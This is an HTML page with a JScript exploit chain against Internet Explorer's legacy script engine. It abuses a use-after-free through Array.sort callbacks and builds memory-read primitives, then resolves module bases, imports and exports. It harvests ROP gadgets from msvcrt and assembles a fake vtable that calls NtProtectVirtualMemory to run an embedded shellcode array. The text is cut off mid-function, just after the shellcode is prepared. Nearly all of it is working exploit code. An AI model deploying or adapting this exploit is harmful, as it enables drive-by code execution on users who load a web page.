<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="x-ua-compatible" content="IE=EmulateIE8" />
        <script language="JScript.Compact">
        
        var Shellcode = [ 0x0004a164, 0x002d0000, 0x94000010, 0x68e58960, 0x00038f88, 0x00003ce8, 0xb81a6800, 0xe8500006, 0x0000007d, 0x7068646a, 0x89656e77, 0x656e68e1, 0x6f680074, 0x682e7272, 0x2d747365, 0x726f6668, 0x77776872, 0xe2892e77, 0x5152006a, 0xd0ff006a, 0x9461ec89, 0xe58955c3, 0x30be5657, 0x64000000, 0x0c408bad, 0x8918788b, 0xebc031fe, 0x74f73904, 0x74f68528, 0x245e8d24, 0x1474db85, 0x85044b8b, 0x6a0d74c9, 0x5de85101, 0x3b000001, 0x06740845, 0x368bc031, 0x468bd7eb, 0x895f5e10, 0x04c25dec, 0xe5895500, 0x0230ec81, 0x458b0000, 0xf8458908, 0x03f8558b, 0xc0833c42, 0xf0458904, 0x8914c083, 0xc289f445, 0x0308458b, 0x4a8b6042, 0xd04d8964, 0x89fc4589, 0x08458bc2, 0x89204203, 0x558bec45, 0x08458bfc, 0x89244203, 0x558be445, 0x08458bfc, 0x891c4203, 0xc031e845, 0x89e04589, 0x458bd845, 0x18408bfc, 0x0fe0453b, 0x0000d286, 0xe0458b00, 0x00850c8d, 0x8b000000, 0x458bec55, 0x11040308, 0x6ad44589, 0xbde85000, 0x3b000000, 0x850f0c45, 0x000000a1, 0x8de0458b, 0x458b0014, 0x04b70fe4, 0x850c8d02, 0x00000000, 0x8be8558b, 0x04030845, 0xd8458911, 0x89fc4d8b, 0xd05503ca, 0x7f7cc839, 0x7b7dd039, 0x00d845c7, 0x31000000, 0xd09d8dc9, 0x8afffffd, 0xfa800814, 0x80207400, 0x15752efa, 0x642e03c7, 0xc3836c6c, 0x0003c604, 0xfed09d8d, 0xeb41ffff, 0x411388de, 0xc6d8eb43, 0x9d8d0003, 0xfffffdd0, 0xe853006a, 0x0000003c, 0xfea3e850, 0xc085ffff, 0x45892974, 0x8d006adc, 0xfffed095, 0x21e852ff, 0x50000000, 0xe8dc75ff, 0xfffffed1, 0xebd84589, 0xe0458d0a, 0x1fe900ff, 0x8bffffff, 0xec89d845, 0x0008c25d, 0x57e58955, 0x8b084d8b, 0xdb310c7d, 0x74003980, 0x01b60f14, 0xb60f600c, 0xd1d301d0, 0xff8541e3, 0xeb41ea74, 0x5fd889e7, 0xc25dec89, 0x00650008, ];
        var spray_size = 20000;  //200 GcBlocks
        var overlay_size = 20000; 
        var total;   //holds the untracked pointers
        var dept;
        var spray;
        var reclaimUsingIndex;
        var mutableVARinname;
 
        var overlaybackup;
        var overlay;
        var variants; 
        var overlaybackupIndex = -1; //leaked target VAR index in overlaybackup (i,e this index holds the leaked VVAL)
        var staticPropertyNameforRECLAIM = Array(379).join('A');
        
        var tosort = new Array();
        for(i = 0; i < 310; i++) tosort[i] = [0, 0];
        var LFHBlocks = new Array();
 
 
 
        
        function CreateVar32(Type, ObjPtr, NextVar) {
            var Data = new Array(); // Every element of this array will be a WORD
            Data.push(Type, 0x00, 0x00, 0x00, ObjPtr & 0xFFFF, (ObjPtr >> 16) & 0xFFFF, NextVar & 0xFFFF, (NextVar >> 16) & 0xFFFF);
            return String.fromCharCode.apply(null, Data);
        }//returns 16 bytes(size of VAR)
        
        
        function ReadByte(Address) {
            reclaimUsingIndex(0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
            return (mutableVARinname.length >> 15) & 0xff; // Shift to align and get the byte.
        }
 
        function ReadWord(Address) {
            reclaimUsingIndex(0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
            return ((mutableVARinname.length >> 15) & 0xff) + (((mutableVARinname.length >> 23) & 0xff) << 8);
        }
 
        function ReadDword(Address) {
            reclaimUsingIndex(0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
            var LowWord = ((mutableVARinname.length >> 15) & 0xff) + (((mutableVARinname.length >> 23) & 0xff) << 8);
            reclaimUsingIndex(0, CreateVar32(0x8, Address + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
            var HighWord = ((mutableVARinname.length >> 15) & 0xff) + (((mutableVARinname.length >> 23) & 0xff) << 8);
            return LowWord + (HighWord << 16);
        }
        
        function LeakObjectAddress(VVALasVAR, targetObj) { // This function does not always work, there are some edge cases. For example if a BSTR is declared var A = "123"; it works fine. However, var A = "1"; A += "23"; resuls in multiple layers of VARs referencing VARs and this function will no longer get the actual BSTR address.
            reclaimUsingIndex(targetObj, CreateVar32(0x8, (VVALasVAR + 8) + 2, 0)); // Skip +8 over Type field of VAR to object pointer field and +2 for BSTR length adjustment
            var LowWord = ((mutableVARinname.length >> 15) & 0xff) + (((mutableVARinname.length >> 23) & 0xff) << 8);
            reclaimUsingIndex(targetObj, CreateVar32(0x8, VVALasVAR + 8 + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field) and +8 to skip over VAR Type
            var HighWord = ((mutableVARinname.length >> 15) & 0xff) + (((mutableVARinname.length >> 23) & 0xff) << 8);
            return ReadDword((LowWord + (HighWord << 16)) + 8); // The VAR at the start of the VVAL has an object pointer that points to yet another VAR: this second one will have the actual address of the object in its object pointer field
        }
        
        
        function FindModuleBase(Address) {
            var Base = (Address & 0xFFFF0000) + 0x4e; // Offset of "This program cannot be run in DOS mode" in PE header.
 
            while(true) {
                if(ReadWord(Base) == 0x6854) { // 'hT'
                    if(ReadWord(Base + 2) == 0x7369) { // 'si'
                        return (Base - 0x4E);
                    }
                }
                Base -= 0x10000;
            }
            return 0;
        }
        
		
        
        function setup(){ //reset globals and spray but not freed yet
            dept = 0; 
            total = new Array();//total = array of Untracked vars pointers
            overlay = new Array();
            spray = new Array();
 
            for(var i = 0; i < overlay_size; i++) overlay[i] = new Object();  //overlay before spray coz we dont want any unnecessary alloc between the spray, free and realloc process
            for(var i = 0; i < spray_size; i++) spray[i] = new Object();
            CollectGarbage();
            tosort[0].sort(exploit_uaf);
        }// end of setup
        
        
          
        function exploit_uaf(untrack1, untrack2){   //after setup() this will free the setup allocations and collect untracked pointers to "total" array
            untrack1 = spray[dept*2];
            untrack2 = spray[dept*2 + 1];
            if(dept > 150){
                spray = new Array(); //free the spray
                CollectGarbage(); //deallocate(free) to heap    
                total.push(untrack1);
                total.push(untrack2);
                return 0;
            } 
                dept += 1;
                tosort[dept].sort(exploit_uaf);
                total.push(untrack1);
                total.push(untrack2);
                return 0;
        }
        
        var InitialReClaim = true;
        
    
        

        function MICreclaimUsingIndex(value, fakeVARasPropertyName){ 
            var PrecisionReClaimAllocCount = 1000; // This is the number of re-claim attempts that are needed for a precision re-claim of a single freed region.
            CollectGarbage(); // Cleanup
    
            if(InitialReClaim) {
                overlaybackup[overlaybackupIndex] = null;
                InitialReClaim = false;
                PrecisionReClaimAllocCount -= 1;
            }
    
            for(var i = 0; i < PrecisionReClaimAllocCount; i++) {
                overlaybackup[i] = null;
            }
    
            CollectGarbage(); // Free the leaked NameList
    
            for(var i = 0; i < PrecisionReClaimAllocCount; i++) {
                overlaybackup[i] = new Object();
                overlaybackup[i][staticPropertyNameforRECLAIM] = 1; // 0x239 property name size for 0x970 NameList allocation size
                overlaybackup[i]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
                overlaybackup[i]["\u0003"] = 1;
                overlaybackup[i][fakeVARasPropertyName] = value; // The mutable variable
            }   
        } //ending reclaimUsingIndex
        
        
        
        
        function NullSanitizeWord(StrWord) {
            var Sanitized = 0;
 
            if(StrWord != 0) {
                if((StrWord & 0x00FF) == 0) {
                    Sanitized = 0; // First byte is NULL, end of the string.
                }
                else {
                    Sanitized = StrWord;
                }
            }
            return Sanitized;
        }
        
        
        
        function StrcmpLeak(StrDwordTable, LeakAddress) { // Compare two strings between an array of WORDs and a string at a memory address
            var TargetTableIndex = 0;
 
            while (TargetTableIndex < StrDwordTable.length) {
                var LeakStrWord = ReadWord(LeakAddress + (4 * TargetTableIndex));
                var SanitizedStrWord = NullSanitizeWord(LeakStrWord);
                var TableWord = (StrDwordTable[TargetTableIndex] & 0x0000FFFF); 
                if(TableWord == SanitizedStrWord) {
                    LeakStrWord = ReadWord((LeakAddress + (4 * TargetTableIndex) + 2));
                    SanitizedStrWord = NullSanitizeWord(LeakStrWord);
                    TableWord = ((StrDwordTable[TargetTableIndex] & 0xFFFF0000) >> 16);

                    if(TableWord == SanitizedStrWord) {
                        if((TargetTableIndex + 1) >= StrDwordTable.length) {
                            return true;
                        }
                        else {
                        }
 
                        TargetTableIndex++;
                    }
                    else {
                        break;
                    }
                }
                else {
                    break;
                }
            }
 
            return false;
        }
        
        
        
        
        
        function ExtractBaseFromImports(ModuleBase, TargetModuleNameTable) { // Grab the first IAT entry of a function within the specified module
            var ExtractedAddresss = 0;
            var FileHdr = ReadDword(ModuleBase + 0x3c);
            var ImportDataDir = ModuleBase + FileHdr + 0x80; // Import data directory
            var ImportRva = ReadDword(ImportDataDir);
            var ImportSize = ReadDword(ImportDataDir + 0x4); // Get the size field of the import data dir
            var CurrentNameDesc = ModuleBase + ImportRva;
 
            while(ImportSize != 0) {
                NameField = ReadDword(CurrentNameDesc + 0xc); // 0xc is the offset to the module name pointer
 
                if(NameField != 0) {
                    if(StrcmpLeak(TargetModuleNameTable, ModuleBase + NameField)) {
                        ThunkAddress = ReadDword(CurrentNameDesc + 0x10);
                        ExtractedAddresss = ReadDword(ModuleBase + ThunkAddress + 8); // +8 since __imp___C_specific_handler can cause issues when imported in some jscript instances
                        break;
                    }
 
                    ImportSize -= 0x14;
                    CurrentNameDesc += 0x14; // Next import descriptor in array
                }
                else {
                    break;
                }
            }
 
            return ExtractedAddresss;
        }
        
        
        
        
        function CheckINTThunk(ModuleBase, INTThunkRva, TargetImportNameTable) {
            var INTThunkValue = ReadDword(ModuleBase + INTThunkRva);
            if(INTThunkValue == 0) {
                return -1;
            }
 
            if((INTThunkValue & 0x80000000) == 0) { // Only parse non-orginal INT entries
                var ImportNameAddress = (ModuleBase + INTThunkValue + 2); // The INT thunk is an RVA pointing at a IMAGE_IMPORT_BY_NAME struct. Skip the hint field in this struct to point directly to the ASCII import name.
                if(StrcmpLeak(TargetImportNameTable, ImportNameAddress)) {
                    return 1;
                }
            }
            return 0;
        }
 
        
              
        
        function ResolveImport(ModuleBase, HintIndex, TargetModuleNameTable, TargetImportNameTable) {
            var ExtractedAddresss = 0;
            var FileHdr = ReadDword(ModuleBase + 0x3c);
            var ImportDataDir = ModuleBase + FileHdr + 0x80; // Import data directory
            var ImportRva = ReadDword(ImportDataDir);
            var ImportSize = ReadDword(ImportDataDir + 0x4); // Get the size field of the import data dir
            var CurrentNameDesc = ModuleBase + ImportRva;
 
            while(ImportSize != 0) {
                NameField = ReadDword(CurrentNameDesc + 0xc); // 0xc is the offset to the module name pointer
 
                if(NameField != 0) {
                    if(StrcmpLeak(TargetModuleNameTable, ModuleBase + NameField)) {
 
                        var HighIATIndex = (HintIndex + 1);
                        var LowIATIndex = (HintIndex - 1);
                        var BaseINTThunkRva = (ReadDword(CurrentNameDesc + 0x0));
                        var BaseIATThunkRva = (ReadDword(CurrentNameDesc + 0x10));
                        var ResolvedIATIndex = -1;
 
                        if(BaseINTThunkRva == 0) {
                            alert("INT is empty in target module");
                        }
                        // Start by checking the INT at the specified hint index
 
                        if(CheckINTThunk(ModuleBase, BaseINTThunkRva + (HintIndex * 4), TargetImportNameTable)) {
                            ExtractedAddresss = ReadDword(ModuleBase + BaseIATThunkRva);
                            break;
                        }
                        // Specified import was not found at the provided hint index. Walk the INT forward/backward in unison from the hint index.
                        var HighINTThunkRva = (BaseINTThunkRva + (HighIATIndex * 4));
                        var LowINTThunkRva = (BaseINTThunkRva + (LowIATIndex * 4));
                        var HitINTThunkCeiling = 0;
 
                        while(true) {
                            if(!HitINTThunkCeiling) {
                                var ThunkRes = CheckINTThunk(ModuleBase, HighINTThunkRva, TargetImportNameTable);
                                if(ThunkRes == -1) {
                                    HitINTThunkCeiling = 1;
                                }
                                else if(ThunkRes) {
                                    ExtractedAddresss = ReadDword(ModuleBase + BaseIATThunkRva + (HighIATIndex * 4));
                                    ResolvedIATIndex = HighIATIndex;
                                    break;
                                }
                                else {
                                    HighINTThunkRva += 4;
                                    HighIATIndex++;
                                }
                            }
                            if(LowINTThunkRva >= BaseINTThunkRva) {
                                if(CheckINTThunk(ModuleBase, LowINTThunkRva, TargetImportNameTable)) {
                                    ExtractedAddresss = ReadDword(ModuleBase + BaseIATThunkRva + (LowIATIndex * 4));
                                    ResolvedIATIndex = LowIATIndex;
                                    break;
                                }
                                LowINTThunkRva -= 4;
                                LowIATIndex--;
                            }
                        }
                        if(ExtractedAddresss != 0) {
                            break;
                        }
                    }
                    ImportSize -= 0x14;
                    CurrentNameDesc += 0x14; // Next import descriptor in array
                }
                else {
                    break;
                }
            }
            return ExtractedAddresss;
        }
 
 
 
        
        function DwordToUnicode(Dword) {
            var Unicode = String.fromCharCode(Dword & 0xFFFF);
            Unicode += String.fromCharCode(Dword >> 16);
            return Unicode;
        }
      
        function TableToUnicode(Table) {
            var Unicode = "";
 
            for (i = 0; i < Table.length; i++) {
                Unicode += DwordToUnicode(Table[i]);
            }
            return Unicode;
        }
        
		
                
        
        function BinaryCmp(TargetNum, CmpNum) { // return -1 for TargetNum being greater, 0 for equal, 1 for CmpNum being greater
            if(TargetNum == CmpNum) {
                return 0;
            }
            while(true) {
                if((TargetNum & 0xff) > (CmpNum & 0xff)) {
                    return -1;
                }
                else if((TargetNum & 0xff) < (CmpNum & 0xff)) {
                    return 1;
                }
                TargetNum = TargetNum >> 8;
                CmpNum = CmpNum >> 8;
            }
        }


        
        
        function ResolveExport(ModuleBase, TargetExportNameTable) {
            var FileHdr = ReadDword(ModuleBase + 0x3c);
            var ExportDataDir = ModuleBase + FileHdr + 0x78;
            if(ExportDataDir) {
                var EATRva = ReadDword(ExportDataDir);
                var TotalExports = ReadDword(ModuleBase + EATRva + 0x14);
                var AddressRvas = ReadDword(ModuleBase + EATRva + 0x1C);
                var NameRvas = ReadDword(ModuleBase + EATRva + 0x20);
                var OrdinalRvas = ReadDword(ModuleBase + EATRva + 0x24);
                var MaxIndex = TotalExports;
                var MinIndex = 0;
                var CurrentIndex = Math.floor(TotalExports / 2);
                var TargetTableIndex = 0;
                var BinRes = 0;
 
                while(TotalExports) {
                    var CurrentNameRva = ReadDword(ModuleBase + NameRvas + 4*CurrentIndex);
 
                    while (TargetTableIndex < TargetExportNameTable.length) {
                        CurrentNameWord = ReadWord(ModuleBase + (CurrentNameRva + (4 * TargetTableIndex)));
                        var ExportNameWord = (TargetExportNameTable[TargetTableIndex] & 0x0000FFFF);
                        var SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
                        BinRes = BinaryCmp(ExportNameWord, SanitizedCurrentNameWord);
 
                        if(!BinRes) {
                            ExportNameWord = ((TargetExportNameTable[TargetTableIndex] & 0xFFFF0000) >> 16);
 
                            if(ExportNameWord != 0) { // Special case: final WORD of name array is 0, consider this a match
                                CurrentNameWord = ReadWord(ModuleBase + (CurrentNameRva + (4 * TargetTableIndex)) + 2);
                                SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
                                BinRes = BinaryCmp(ExportNameWord, SanitizedCurrentNameWord);
                                if(!BinRes) {
                                    if((TargetTableIndex + 1) >= TargetExportNameTable.length) {
                                        Ordinal = ReadWord(ModuleBase + OrdinalRvas + 2*CurrentIndex);
                                        MainExport = (ModuleBase + ReadDword(ModuleBase + AddressRvas + 4*Ordinal));
                                        return [ MainExport , CurrentIndex];
                                    }
                                    else {
                                    }
                                    TargetTableIndex++;
                                }
                                else {
                                    TargetTableIndex = 0;
                                    break;
                                }
                            }
                            else {
                                if((TargetTableIndex + 1) >= TargetExportNameTable.length) {
                                    Ordinal = ReadWord(ModuleBase + OrdinalRvas + (2 * CurrentIndex));
                                    MainExport = (ModuleBase + ReadDword(ModuleBase + AddressRvas + (4 * Ordinal)));
                                    return [ MainExport, CurrentIndex];
                                }
                                else {
                                    alert("Fatal error during export lookup: target export name array contained a NULL byte not at the end of its final element");
                                }
                            }
                        }
                        else {
                            TargetTableIndex = 0;
                            break;
                        }
                    }
                    if(BinRes == 1) { // Target is greater than what it was compared to: reduce current index
                        if(MaxIndex == CurrentIndex) {
                            alert("Failed to find export: index hit max");
                            break;
                        }
                        MaxIndex = CurrentIndex;
                        CurrentIndex = Math.floor((CurrentIndex + MinIndex) / 2);
                    }
                    else if (BinRes == -1) { // Target is less than what it was compared to: enhance current index
                        if(MinIndex == CurrentIndex) {
                            alert("Failed to find export: index hit min");
                            break;
                        }
                        MinIndex = CurrentIndex;
                        CurrentIndex = Math.floor((CurrentIndex + MaxIndex) / 2);
                    }
                    if(CurrentIndex == MaxIndex && CurrentIndex == MinIndex) {
                        alert("Failed to find export: current, min and max indexes are all equal");
                        break;
                    }
                }
            }
            return [0,0];
        }
        
 
        
        
        function HarvestGadget(HintExportAddress, MaxDelta, Data, DataMask, MagicOffset) {
            var MaxHighOffset = (HintExportAddress + MagicOffset + MaxDelta);
            var MinLowOffset = ((HintExportAddress + MagicOffset) - MaxDelta);
            var LeakAddress = HintExportAddress + MagicOffset;
            var LeakFunc = ReadDword; // In the event a 0x00FFFFFF mask is used, ReadDword will be used, but will still be filtered
            if(MinLowOffset < HintExportAddress) {
                MinLowOffset = HintExportAddress;
            }
            if(DataMask == 0x0000FFFF) {
                LeakFunc = ReadWord;
            }
            else {
                alert("Unhaandled data mask for gadget harvest");
                return 0;
            }
            if((LeakFunc(LeakAddress) & DataMask) == Data) {
            }
            else {
                var HighAddress = (LeakAddress + 1);
                var LowAddress = LeakAddress - 1;
                LeakAddress = 0;
                while(LowAddress >= MinLowOffset || HighAddress < MaxHighOffset) {
                    if(LowAddress >= MinLowOffset) {
                        if((LeakFunc(LowAddress) & DataMask) == Data) {
                            LeakAddress = LowAddress;
                            break;
                        }
                        LowAddress -= 1;
                    }
                    if(HighAddress < MaxHighOffset) {
                        if((LeakFunc(HighAddress) & DataMask) == Data) {
                            LeakAddress = HighAddress;
                            break;
                        }
                        HighAddress += 1;
                    }
                }
            }
 
            return LeakAddress;
        }
        
        
        
        
        
        function ResolveGadgetSet(MsvcrtBase) { // Dynamically resolve gadget addresses via delta from export addresses - MSVCRT.DLL is used to harvest gadgets as its EAT is not protected by EAF/EAF+
            var GadgetSetObj = new Object();
            // XCHG ESP, EAX; RET
            var ExportPair = ResolveExport(MsvcrtBase, [0x696c5f5f, 0x735f6d62, 0x5f326573, 0x31676f6c, 0x00000030]); // 'il__' 's_mb' '_2es' '1gol' '0'
            if(ExportPair[0]) {
                GadgetSetObj.StackPivot = HarvestGadget(ExportPair[0], 0x9C37, 0xc394, 0x0000FFFF, 0x4e5);
 
                if(GadgetSetObj.StackPivot != 0) {
                    GadgetSetObj.RopNop = (GadgetSetObj.StackPivot + 1);
                    // POP EAX; RET
                    ExportPair = ResolveExport(MsvcrtBase, [0x6661735f, 0x64665f65, 0x00727669]); // 'fas_' 'df_e' 'rvi'
                    if(ExportPair[0]) {
                        GadgetSetObj.PopEax = HarvestGadget(ExportPair[0], 0x100, 0xc358, 0x0000FFFF, 0x00000013); // Win7/8.1 have same offset
                        if(GadgetSetObj.PopEax) {
                            return GadgetSetObj;
                        }
                        else {
                            alert("Failed to resolve POP EAX gadget address");
                        }
                    }
                    else {
                        alert("Failed to resolve msvcrt.dll!_safe_fdivr as export hint");
                    }
                }
                else {
                    alert("Failed to resolve stack pivot gadget address");
                }
            }
            else {
                alert("Failed to resolve msvcrt.dll!__libm_sse2_log10 as export hint");
            }
            return null;
        }
        
        
    
        
        function ConvertDwordArrayToBytes(DwordArray) {
            var ByteArray = [];
            for (i = 0; i < DwordArray.length; i++) {
                ByteArray.push(DwordArray[i] & 0xffff);
                ByteArray.push((DwordArray[i] & 0xffff0000) >> 16);
            }
            return String.fromCharCode.apply(null, ByteArray);
        }
        
        
        
        
        function ResolveNtProtectProxyStub(ScanAddress, MaxOffset) {
			var Offset = 0;
			var LastMovEaxAddress = 0;
			var ProxyStubAddress = 0;
			var RetnScenarioOne = 0;
			var RetnScenarioTwo = 0;
 
			// Scan forward searching for 0xB8 opcode. Once one is found, scan forward until 0xC2 0x14 0x00 is found. Proxy stub address will be the address of the last 0xB8 opcode +5.
 
			while(Offset < MaxOffset) {
				var LeakAddress = ScanAddress + Offset;
				var LeakedWord = ReadWord(LeakAddress);
				var ByteOne = (LeakedWord & 0x00FF);
				var ByteTwo = ((LeakedWord & 0xFF00) >> 8);
 
				if(ByteOne == 0xB8) {
					LastMovEaxAddress = LeakAddress;
				}
				else if(ByteTwo == 0xB8) {
					LastMovEaxAddress = (LeakAddress + 1);
				}
        /*
        Scenario one:
 
            Byte one = 0xc2
            Byte two = 0x14
 
        Next:
 
            Byte one = 0x00
 
        --
 
        Scenario two:
 
            Byte two - 0xC2
 
        Next:
 
            Byte one - 0x14
            Byte two - 0x00
        */
				else if(LastMovEaxAddress != 0) {
					if(!RetnScenarioOne) {
						if(ByteOne == 0xc2 && ByteTwo == 0x14) {
							RetnScenarioOne = 1;
						}
					}
					else {
						if(ByteOne == 0x00) {
							ProxyStubAddress = (LastMovEaxAddress + 5);
							break;
						}
						else {
							RetnScenarioOne = 0;
						}
					}
					if(!RetnScenarioTwo) {
						if(ByteTwo == 0xC2) {
							RetnScenarioTwo = 1;
						}
					}
					else {
						if(ByteOne == 0x14 && ByteTwo == 0x00) {
							ProxyStubAddress = (LastMovEaxAddress + 5);
							break;
						}
						else {
							RetnScenarioTwo = 0;
						}
					}
				}
 
				Offset += 2;
			}
			return ProxyStubAddress;
		}
        


        function CreateFakeVtable(FakeVtablePaddingSize, VtableSize, NtProtectAddress, ShellcodeAddress, RopGadgetSet, WritableAddress) {
        // [Padding]
        // [ROPNOP sled]
        // [Stack alignment gadget]
        // [Stack pivot]
        // [Set EAX to 0x4D]
        // [NtProtoectVirtualMemry]
        // [Shellcode address] <- NtProtoectVirtualMemry return
        // [NtProtoectVirtualMemry parameters]
        // [Stack pivot]
        // [Padding]
            
            var FakeVtable = "";
            var X = 0;
            var Y = 0;
            var PaddingArrayLen = FakeVtablePaddingSize / 4;
            var TotalObjLen = ((FakeVtablePaddingSize + VtableSize) / 2);
            var PaddingArray = [];
            var SyscallNumber;
 
            for(i = 0; i < PaddingArrayLen; i++) {
                PaddingArray[i] = 0x11111111;
            }
 
            FakeVtable += ConvertDwordArrayToBytes(PaddingArray);
 
            while (FakeVtable.length < TotalObjLen) {
                if(Y == 0x9c) {
                    FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.StackPivot]);
                }
                else if(Y == 0x98) {
                    FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.PopEax]);
                }
                else {
                    FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.RopNop]);
                }
 
                Y += 4;
            }
 
        // Layout of storage address region
        // +0x0 | Original ESP
        // +0x4 | Shellcode address
        // +0x8 | Shellcode size
        // +0xC | Old protection
 
            FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.PopEax]);
 
            
            SyscallNumber = 0x4F; // Windows 8.1 x64 NtProtectVirtualMemory SYSCALL #
 
        // NTSTATUS NtProtectVirtualMemory(IN HANDLE ProcessHandle, IN OUT PVOID *BaseAddress, IN OUT PULONG RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect);
 
            FakeVtable += ConvertDwordArrayToBytes([SyscallNumber]);
            FakeVtable += ConvertDwordArrayToBytes([NtProtectAddress]);
            FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.RopNop]); // Return address
            FakeVtable += ConvertDwordArrayToBytes([0xFFFFFFFF]);
            FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0x4]);
            FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0x8]);
            FakeVtable += ConvertDwordArrayToBytes([0x40]); // +RX (PAGE_EXECUTE_READ) causes problems due to the page alignment used by NtProtectVirtualMemory. The shellcode is unlikely to begin on a clean multiple of 0x1000, and similarly won't probably end on one either (although this attribute can be manipulated with padding). +RW data on the heap surrounding the shellcode may end up +RX and this causes crashes.
            FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0xC]);
            FakeVtable += ConvertDwordArrayToBytes([ShellcodeAddress]);
            FakeVtable += ConvertDwordArrayToBytes([0x11111111]); // Shellcode will return to this pseudo-address
            // Padding on the end of the vtable is not needed: both NtProtectVirtualMemory and the shellcode will be using memory below this address
            return FakeVtable;
        }
        
        
		
        
        function main(){
            reclaimUsingIndex = MICreclaimUsingIndex;
            CollectGarbage();
            // Trigger LFH for a size of 0x648
            for(i = 0; i < 50; i++) {
                Temp = new Object();
                Temp[Array(379).join('A')] = 1; // Property name size of 0x17a (378) will produce an allocation of 0x648 bytes
                LFHBlocks.push(Temp);
            }
            
            
            
            setup();            
            for(var i = 0; i < overlay_size; i++) 
            {
                overlay[i][staticPropertyNameforRECLAIM] = 1; //1VVAL == 1Gcblock size
                overlay[i]["BBBBBBBBB"] = 1; //18(9*2) bytes for 32bit
                overlay[i]["\u0003"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
                overlay[i]["C"] = i; // The address of this VVAL will be leaked
            }//done relcaim process 
            overlaybackup = overlay;
            //done overlay
            var LeakedVvalAddress = 0;
        
            for(i = 0; i < total.length; i++){
                if(typeof total[i] === "number" && total[i] > 0x1000){
                    LeakedVvalAddress = total[i];
                    break;
                }
            }//done scanning the fake VARs for VVAL address
            
 
            if( LeakedVvalAddress != 0 ){
                variants = "AA"; // 2 wide char == (4 byte) + (the bstr len i,e 4byte) = 8 byte (filling the GcBlock LINKEDLIST POINTER)
                for(i=0; i < 46; i++) {
                    variants += CreateVar32(0x80, LeakedVvalAddress, 0);
                }
                while( variants.length < 0x17a) variants += "A";  // padding
                setup();
            
                for(var i = 0; i < overlay_size; i++) 
                {
                    overlay[i][variants] = 1;
                }//reclaim with fake VAR with the address of the leaked VVAL (here &VVAL == VAR) coz the first member of VVAL is VAR and not *VAR
                
                var LeakedVVALasVAR; // the VAR holding this leaked VVAL (in the overlaybackup)
                for(i = 0; i < total.length; i++){
                    if(typeof total[i] === "number"){
                        overlaybackupIndex = parseInt((total[i]) + ""); // Reads the target index of overlaybackup[(x)]. Since this is of type 0x80 and not directly 0x3, it cannot be easily read directly, so converting it to a string is a quick solution.
                        LeakedVVALasVAR = total[i]; //will be used to verify if reclaimUsingIndex() works?
                        break;
                    }
                }
                
                reclaimUsingIndex(0x11, "A");           
                if(LeakedVVALasVAR + "" == 0x11) { //since reflect changes from reclaimUsingIndex, we now create a fakeVAR that points the name[] {will be used to create readPRIMITIVE}
                    
                    reclaimUsingIndex(0x11, CreateVar32(0x3, 0x22, 0)); // fill the name[] with a fakeVAR(which is an integer)
                    
                    variants = "AA";
                    for(i=0; i < 46; i++) {
                        variants += CreateVar32(0x80, LeakedVvalAddress + 0x30, 0); //0x30 is the offset to name[] in VVAL struct 32bit
                    }
                    while( variants.length < 0x17a) variants += "A";  // padding
                    setup();
                    
                    for(var i = 0; i < overlay_size; i++){
                        overlay[i][variants] = 1; // reclaiming memory by spraying fake VARs actually pointing to the name[](VVAL)
                    }
                    
                    
                    for(i = 0; i < total.length; i++){
                        if(typeof total[i] === "number" && total[i] + "" == 0x22){
                            mutableVARinname = total[i];
                            break;
                        }
                    }
                
                    reclaimUsingIndex(0, CreateVar32(0x3, 0x33, 0)); //to verify if we can mutate this mutable VAR in name[]
                    
                    if( mutableVARinname + "" == 0x33 ){
                        if( ReadByte(LeakedVvalAddress + 0x30) == 0x8 ){
                            var objToLeak = new Object();
                            var objectAddress = LeakObjectAddress(LeakedVvalAddress, objToLeak);
                            var VtableAddress = ReadDword(objectAddress);
                            
                            var JScriptBase = FindModuleBase(VtableAddress);
                            if(JScriptBase != 0){
                                alert("found! jscript base:");
                                alert(JScriptBase.toString(16));
                                
                                
                                var Kernel32ImportX = ExtractBaseFromImports(JScriptBase, [0x4e52454b, 0x32334c45]);
 
                                if(Kernel32ImportX != 0) {
                                    var Kernel32Base = FindModuleBase(Kernel32ImportX);
                                    if(Kernel32Base != 0) {
                                        alert("found kernel32base");
                                        
                                        var HintIndex = 62;
                                        var NtProtectAddress = ResolveImport(Kernel32Base, HintIndex, [0x6c64746e, 0x6c642e6c], [0x7250744e, 0x6365746f]); // 'rPtN' 'ceto'
                                        
                                        if(NtProtectAddress != 0) {
                                            alert("Successfully resolved NtProtoectVirtualMemry address from kernel32.dll IAT: ");
                                            alert(NtProtectAddress.toString(16));
                                            
                                            var MsvcrtImportX = ExtractBaseFromImports(JScriptBase, [0x6376736d, 0x642e7472]);
                                            var MsvcrtBase = FindModuleBase(MsvcrtImportX);
                                            var RopGadgetSet = ResolveGadgetSet(MsvcrtBase);
                                            
                                            if(RopGadgetSet != null) {
                                                alert("gadgets leaked from MSVCRT");     
                                                var NtProtectProxyStubAddress = ResolveNtProtectProxyStub(NtProtectAddress, 0x100);
                                        if(NtProtectProxyStubAddress == 0) {
                                            return 0;
                                            }

                                                var ShellcodeStr = TableToUnicode(Shellcode);
                                                var ShellcodeLen = (ShellcodeStr.length * 2);
                                                ShellcodeStr = ShellcodeStr.substr(0, ShellcodeStr.length); // This trick is essential to ensure the "address of" primitive gets the actual address of the shellcode data and not another VAR in a chain of VARs (this happens when a VAR is appended to another repeaatedly as is the case here)
